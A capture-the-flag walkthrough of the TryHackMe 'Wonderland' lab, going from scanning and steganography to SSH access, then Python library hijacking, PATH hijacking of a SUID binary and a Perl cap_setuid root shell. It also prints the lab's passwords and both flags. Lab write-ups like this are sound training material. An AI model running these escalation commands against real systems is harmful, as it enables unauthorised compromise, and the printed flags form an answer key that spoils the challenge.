# Walkthrough: TryHackMe - Wonderland
## Reconnaissance & Initial Access
## Part 1: Network Reconnaissance
### 1. Nmap Port Scan
An Nmap service scan was performed against the target IP (```10.49.132.126```) to identify active services and open ports.
```bash
nmap -sV -sC -p- 10.49.132.126
```
Scan Results: 
| Port	  | State	 | Service	| Version / Details                                        |
| :--     | :--    | :--      | :--                                                      |
| 22/tcp	| Open	 | SSH	    | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3                          |
| 80/tcp	| Open	 | HTTP	    | Golang net/http server (Title: Follow the white rabbit.) |

## Part 2: Web Enumeration & Steganography
### 2. Directory Brute-Forcing with Gobuster

Navigating to ```[http://10.49.132.126/](http://10.49.132.126/)``` displayed a landing page featuring an image of the White Rabbit. To uncover hidden web paths, ```gobuster``` was run against port 80 using the common wordlist:
```bash
gobuster dir -u http://10.49.132.126 -w /usr/share/wordlists/dirb/common.txt
```
Discovered Paths:
- ```/img/``` (Status: 301)
- ```/r/``` (Status: 301)

### 3. Image Steganography Analysis

Inspecting ```/img/``` revealed three media files: ```alice_door.jpg```, ```alice_door.png```, and ```white_rabbit_1.jpg```.

Using ```steghide``` on ```white_rabbit_1.jpg``` (with an empty passphrase) successfully extracted hidden file data:
```bash
steghide extract -sf white_rabbit_1.jpg
cat hint.txt
```
Extracted Hint:
```bash
follow the r a b b i t
```
## Part 3: Path Traversal & Credential Discovery
### 4. Following the Directory Path
The extracted hint pointed toward expanding the ```/r/``` directory sequentially letter-by-letter to spell out r-a-b-b-i-t:
```bash
$$\text{URL Path: } \texttt{[http://10.49.132.126/r/a/b/b/i/t/](http://10.49.132.126/r/a/b/b/i/t/)}$$
```
Navigating to ```[http://10.49.132.126/r/a/b/b/i/t/](http://10.49.132.126/r/a/b/b/i/t/)``` opened a page titled "Open the door and enter wonderland".

### 5. Source Code Inspection
Viewing the HTML source code ```(view-source:[http://10.49.132.126/r/a/b/b/i/t/](http://10.49.132.126/r/a/b/b/i/t/))``` revealed a hidden paragraph element:
```bash
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```
Discovered Credentials:
- Username: alice
- Password: HowDothTheLittleCrocodileImproveHisShiningTail

## Part 4: Initial Access via SSH
### 6. Authentication
Using the credentials retrieved from the page source, an SSH connection was established to the target host:
```bash
ssh alice@10.49.132.126
```
Connection Status:
```bash
alice@10.49.132.126's password: HowDothTheLittleCrocodileImproveHisShiningTail
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

alice@wonderland:~$
```
- Initial Access Achieved: Successfully authenticated as user ```alice```.

---

## Horizontal Privilege Escalation & Lateral Movement
## Part 1: Lateral Movement from alice to rabbit
### 1. Privilege Enumeration (```alice```)
After landing as ```alice```, privilege checks were performed to identify potential escalation vectors:
```bash
alice@wonderland:~$ sudo -l
```
Sudo Privileges Output:
```bash
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
```alice``` is permitted to execute the Python script ```/home/alice/walrus_and_the_carpenter.py``` as the user ```rabbit```.

### 2. Python Library Hijacking Analysis
Inspecting ```/home/alice/walrus_and_the_carpenter.py``` revealed that the script begins by importing the standard ```random``` module:
```bash
import random
```
Because Python searches the current working directory prior to evaluating the standard library path, a Python library hijacking attack can be executed by creating a malicious file named ```random.py``` in ```/home/alice/```.

### 3. Exploitation & Code Execution as rabbit
A custom ```random.py``` module was generated in ```/home/alice``` to spawn a Bash shell:
```bash
echo 'import os' > random.py
echo 'os.system("/bin/bash")' >> random.py
```
Executing the script with ```sudo -u``` rabbit triggered the local ```random.py``` import instead of the system library:
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Shell Elevation Verification:
```bash
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```
## Part 2: Privilege Escalation from rabbit to hatter
### 4. Binary Analysis (/home/rabbit/teaParty)
Navigating to the rabbit user's home directory (```/home/rabbit/```) revealed a SETUID binary named ```teaParty```:
```bash
ls -la /home/rabbit/
```
File Permissions:
```bash
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
```
Inspecting the binary contents via ```cat``` revealed an unquoted call to the ```date``` binary without using an absolute file path:
```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
### 5. PATH Hijacking Exploitation
Since ```teaParty``` invokes ```date``` directly without an absolute path (```/bin/date```), modifying the user ```PATH``` variable allows hijacked execution.
A malicious executable script named ```date``` was created inside ```/home/rabbit```:
```bash
echo '#!/bin/bash' > date
echo '/bin/bash' >> date
chmod +x date
```
The ```PATH``` environment variable was updated to place ```/home/rabbit``` at the beginning of the execution path:
```bash
export PATH=/home/rabbit:$PATH
```
### 6. Executing the Binary
Running ```./teaParty``` forces the ```SUID``` binary to evaluate ```/home/rabbit/date``` before system binaries, spawning a shell as ```hatter```:
```bash
./teaParty
```
Terminal Shell Upgrade:
```bash
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```
## Part 3: Credential Persistence & SSH Access (hatter)
### 7. Credential Discovery
Navigating to ```/home/hatter``` revealed a plaintext password file:
```bash
cd /home/hatter
cat password.txt
```
Retrieved Credential:
- Username: hatter
- Password: WhyIsARavenLikeAWritingDesk?

### 8. Direct SSH Authentication
To ensure interactive stability, an SSH session was established using the newly recovered credentials:
```bash
ssh hatter@10.49.132.126
```
```bash
hatter@10.49.132.126's password: WhyIsARavenLikeAWritingDesk?
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

hatter@wonderland:~$
```
Current State: Direct access achieved as ```hatter```. Ready for final privilege escalation to ```root```.

---

## Privilege Escalation to Root & Flag Retrieval
## Part 1: Capability Enumeration
1. Privilege Checks as ```hatter```
After logging in as hatter, standard privilege checks were performed:
```bash
hatter@wonderland:~$ sudo -l
```
Sudo Check Result:
```bash
[sudo] password for hatter:
Sorry, user hatter may not run sudo on wonderland.
```
Next, SUID binary enumeration was conducted across the system:
```bash
hatter@wonderland:~$ find / -perm -u=s -type f 2>/dev/null
```
Standard SUID binaries were identified, but none yielded immediate escalation opportunities.

### 2. File Capabilities Enumeration
Enumerating Linux file capabilities across the filesystem using ```getcap``` revealed unusual privileges assigned to Perl:
```bash
hatter@wonderland:~$ getcap -r / 2>/dev/null
```
Output:
```bash
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
- Vulnerability Identified: ```/usr/bin/perl``` possesses the ```cap_setuid+ep``` capability, allowing any user executing Perl to manipulate its Effective User ID (EUID) and set it to ```0``` (```root```).

 ## Part 2: Privilege Escalation to root
### 3. Exploiting POSIX setuid via Perl
Using GTFOBins techniques for Linux capabilities, a Perl one-liner was executed to set the user ID to ```0``` and spawn a root Bash shell:
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'
```
Root Elevation Verification:
```bash
root@wonderland:~# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```
## Part 3: Flag Retrieval
In this challenge, the standard flag locations are inverted ("down the rabbit hole").

### 4. User Flag Location
The ```user.txt``` flag was located inside ```/root/```:
```bash
cd /root
cat user.txt
```
User Flag:
```bash
thm{"Curiouser and curiouser!"}
```
### 5. Root Flag Location
The ```root.txt``` flag was located inside ```/home/alice/```:
```bash
cd /home/alice
cat root.txt
```
Root Flag:
```bash
thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```
## Summary of Completed Kill Chain
```bash
[ Web Enumeration ] ---> [ Steganography ] ---> [ SSH as alice ]
                                                      |
                                     (Python Library Hijacking)
                                                      v
[ Full System Compromise ] <-- (Capabilities) -- [ SSH as hatter ] <-- (PATH Hijacking) -- [ Shell as rabbit ]
```
